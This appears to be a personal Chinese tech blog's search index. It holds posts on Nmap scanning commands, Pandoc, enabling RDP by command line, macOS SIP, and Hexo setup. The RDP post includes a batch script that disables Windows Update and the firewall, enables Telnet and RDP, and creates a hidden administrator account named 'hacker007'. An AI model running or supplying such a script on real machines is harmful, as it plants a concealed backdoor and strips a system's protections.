    <content type="text"><![CDATA[http://www.91ri.org/8654.html Nmap 介绍 四项基本功能 主机发现（Host Discovery） 端口扫描（Port Scanning） 版本侦测（Version Detection） 操作系统侦测（Operating System Detection） 而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。 基本使用主机发现nmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24 # 多主机地址扫描nmap -A -T4 host # -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)# -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。 常规使用nmap IP/Hostname # 最基本的使用情况nmap host1 host2 host3 etc... # 扫描多主机nmap 192.168.0.1-192.168.1.254 # 扫描IP地址段nmap 192.168.0.1/23 # CIDR格式的网络地址段（与上一条命令等同）nmap -iL list.txt # 扫描目标主机列表nmap -Pn host # 假定目标存活 高级使用nmap -A host # ？？？？？？？ 渗透测试中不常用(我反正没用过)nmap 192.168.1.0/24 --exclude 192.168.1.11 # 排除一些主机nmap -iR 100 # 随机扫描互联网上100个主机nmap -Sp # 只ping扫描，nmap -PS # TCP SYN scan (TCP SYN ping)nmap -PA # TCP ACK scan pingnmap -PU # UDP scan pingnmap -PY # ??? SCTP scan pingnmap -PE/PP/PM # ??? ICMP echo/timestamp/netmask request discovery probes 什么鬼？nmap -PO [protocol] host # 指定协议pingnmap -PR # ??? ARP ping nmap --traceroute # traceroute 功能 探测网络路径nmap -n/-R # Never do DNS resolution/Always resolve [default: sometimes]nmap --dns-servers serv1,serv2,,, # 指定DNSnmap --system-dns # 使用系统DNSnmap -sL IPs # 列出IPs的反向DNS结果nmap 参考资料Introduction to Nmap Nmap从探测到漏洞利用备忘录 – Nmap简介(一) #零散知识Nmap脚本引擎(NSE)- 网络探测 - 漏洞检测 - 漏洞利用 端口状态说明 Open(开放的): 应用程序正在这个端口上监听连接。 Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。 Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。 Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。 Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。 Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Pandoc | a universal document converter]]></title>
    <url>%2F2017%2FPandoc-a-universal-document-converter%2F</url>
    <content type="text"><![CDATA[近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。 官方主页: http://www.pandoc.org Get Start: http://www.pandoc.org/getting-started.html 安装brew install pandoc # 简单到爆pandoc --verison # 查看版本 转换文件Demos : http://www.pandoc.org/demos.htmlpandoc test.md -f markdown -t html -s -o test.html# 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.pandoc -s -S MANUAL.txt -o example29.docxpandoc source/_posts/Pandoc-a-universal-document-converter.md -o ~/TempDocs/pandoc.docx 实测，能进行转换，但貌似排版格式就变得有点难看了。 不知是否是因为使用了表格，而表格的转换导致布局混乱。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Enable RDP through cmd line]]></title>
    <url>%2F2017%2FEnable-RDP-through-cmd-line%2F</url>
    <content type="text"><![CDATA[开启RDP通过命令行修改注册表。 # 开启RDPreg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f# 关闭RDPreg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f# 查询fDenyTSConnections值 0表示RDP开启 1表示RDP关闭reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections RDP端口# 查询rdp端口号reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber 防火墙相关 Netsh AdvFirewall.aspx)# 防火墙状态netsh advfirewall monitor show firewall# 允许访问3389端口netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389# 关闭防火墙netsh firewall set opmode mode=disable 开启远程协助reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f 其它# 从进程中查找rdp进程tasklist /svc | find "TermService"# 根据pid（1316）查询端口号netstat -ano | find "1316" 脚本(maybe dangerous) &lt;未实际使用，仅供参考&gt;@echo offREM ****************REM Disable off "AUTO UPDATE"REM ****************sc config wuauserv start= disablednet stop wuauservREM ****************REM Disable windows xp FirewallREM ****************netsh firewall set opmode disableREM ****************REM Enable TELNETREM ****************sc config tlntsvr start= autonet start telnetREM ****************REM Enable Remote DesktopREM ****************reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /fREM ***************REM Create a HIDDEN USER usr= hack007, pass= daniREM ***************net user hacker007 dani /addnet localgroup "Administrators" /add hacker007net localgroup "Users" /del hacker007reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hacker007 /t REG_DWORD /d 0 /freg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f]]></content>
  </entry>
  <entry>
    <title><![CDATA[MacOS - SIP (System Integrity Protection) 系统集成保护]]></title>
    <url>%2F2017%2FMac-SIP%2F</url>
    <content type="text"><![CDATA[Mac - SIP 系统集成保护官方资料About System Integrity Protection on your Mac 开启/关闭SIP参考来源 http://www.jianshu.com/p/0572336a0771 1.进入Recovery Mode开机按住command+R 2.使用csrutil命令 打开终端Terminal，键入csrutil可以显示该命令的使用方法➜ ~ csrutilusage: csrutil &lt;command&gt;Modify the System Integrity Protection configuration. All configuration changes apply to the entire machine.Available commands: clear Clear the existing configuration. Only available in Recovery OS. disable Disable the protection on the machine. Only available in Recovery OS. enable Enable the protection on the machine. Only available in Recovery OS. status Display the current configuration. netboot add &lt;address&gt; Insert a new IPv4 address in the list of allowed NetBoot sources. list Print the list of allowed NetBoot sources. remove &lt;address&gt; Remove an IPv4 address from the list of allowed NetBoot sources. 正常系统模式下仅可以用status命令查询SIP状态 3.常用参数clear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效) disable：关闭SIP(仅在恢复模式下有效) enable：开启SIP(仅在恢复模式下有效) status：查询SIP状态 4.常用参数进阶除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下csrutil enable [--without kext|fs|debug|dtrace|nvram] [--no-internal]# 单项使用：sudo csrutil enable –without fs：Filesystem Protections disablesudo csrutil enable –without kext：Kext Signing disablesudo csrutil enable –without debug：Debugging Restrictions disablesudo csrutil enable –without nvram：NVRAM Protections disablesudo csrutil enable –without dtrace：DTrace Restrictions disable# 组合使用：sudo csrutil enable –without kext –without fs：Filesystem Protections and Kext Signing are disabled mac下使用proxychains-ng实现代理由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。]]></content>
  </entry>
  <entry>
    <title><![CDATA[The begin of blog]]></title>
    <url>%2F2017%2Fhello-world%2F</url>
    <content type="text"><![CDATA[浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。这篇就算是一个开端，主要记录下hexo该如何使用。 记录一个坑了自己很久的问题：每次hexo d部署之后，自定义域名都恢复到默认的情况，以至于每次部署后都需要在setting中重新配置自定义域名。 【解决办法】：在setting中进行的自定义域名，本质上在根目录下新建一CNAME文件，文件内容为自定义的域名。所以，可以在本地hexo目录的public文件夹下新建一个内容为自定义域名的文件名为“CNAME”的文件。 2017年06月09日 记 搭建hexo静态博客Hexo官方文档 :: https://hexo.io/zh-cn/docs 安装$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg # 下载Node.js安装包$ open node-v6.10.2.pkg # 傻瓜式安装$ brew install git # 安装git$ npm install -g hexo-cli # 安全hexo$ hexo init &lt;folder&gt; # 从hexo官网下载初始化文件$ cd &lt;folder&gt; $ npm install # 安装站点文件$ hexo server # 启动服务器。默认情况下，访问网址为： http://localhost:4000/$ hexo new [layout] &lt;title&gt; # 新建一个post$ hexo generate # 生成静态文件 使用$ hexo new [layout] &lt;title&gt; # layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。 # Hexo 有三种默认布局：post、page 和 draft。$ hexo new draft &lt;title0&gt; # 新建一份草稿$ hexo publish [layout] &lt;title0&gt; # 将draft移动到post$ hexo generate # 生成静态文件 部署$ npm install hexo-deployer-git --save # 安装hexo-deployer-git以实现git部署$ vim _config.yml--------------[file content] deploy: type: git repo: &lt;repository url&gt; # 库（Repository）地址 branch: [branch] # 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。 message: [message] # 自定义提交信息 (默认为 Site updated: &#123;&#123; now('YYYY-MM-DD HH:mm:ss') &#125;&#125;)--------------[file content]$ hexo deploy # 部署 Github 配置新建用于存放pages的repo在GitHub上建一个repository（库），任意命名。如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。 新建SSH Keys我使用SSH连接GitHub。 官方文档 $ ls -al ~/.ssh # 查看是否有 id_rsa 和 id_rsa.pub 文件# 如果不存在或者想要生成新的密钥对，可使用下面命令$ ssh-keygen -t rsa -b 4096 -C "user@oddboy.cn"$ pbcopy &lt; ~/.ssh/id_rsa.pub # 很强势的一个命令，将文件内容直接复制到剪贴板。 在GitHub的Personal setting –&gt; SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。 如此, hexo depoly就可以用了。 新建用于存放hexo博客源码的repohexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。 $ git init # git本地目录初始化$ git remote add origin git@github.com:odboy/hexoBlog-src.git # 配置远程git库$ git add . $ git commit -m "comment信息"$ git status # 查看分支情况$ git push -u origin master # 推送到master分支 修改主题 – spfk安装$ cd ~/Documents/hexoBlog$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk$ cd themes/spfk$ git pull # 主题update$ vim _config.yml-------------------- # Extensions ## Plugins: https://hexo.io/plugins/ ## Themes: https://hexo.io/themes/ theme: spfk-------------------- 插件配置图片辅助工具hexo-asset-imagenpm install https://github.com/CodeFalling/hexo-asset-image --save]]></content>
  </entry>
</search>
